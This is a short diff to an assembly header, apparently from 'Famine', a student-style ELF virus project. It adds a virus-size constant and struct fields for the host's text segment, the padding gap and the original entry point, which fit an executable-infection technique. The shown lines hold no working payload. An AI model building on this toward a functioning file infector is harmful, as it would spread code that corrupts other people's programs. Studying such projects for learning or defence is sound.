@@ -1,6 +1,7 @@
 ; Famine defines
 %define		DIRENTS_BUFF_SIZE	4096
 %define		PATH_MAX			1024
+%define		VIRUS_SIZE			(_finish - _starting)
 
 ; SYSCALLS defines
 %define		SYS_WRITE			1
@@ -77,6 +78,13 @@ struc	famine
 	.fd:			resd	1
 	.map_ptr:		resq	1
 	.fsize:			resd	1
+	.payload_size:	resq	1
+	.gap_size:		resq	1
+	.txt_offset:	resq	1
+	.txt_filesz:	resq	1
+	.txt_vaddr:		resq	1
+	.next_offset:	resq	1
+	.orig_entry:	resq	1
 endstruc
 
 
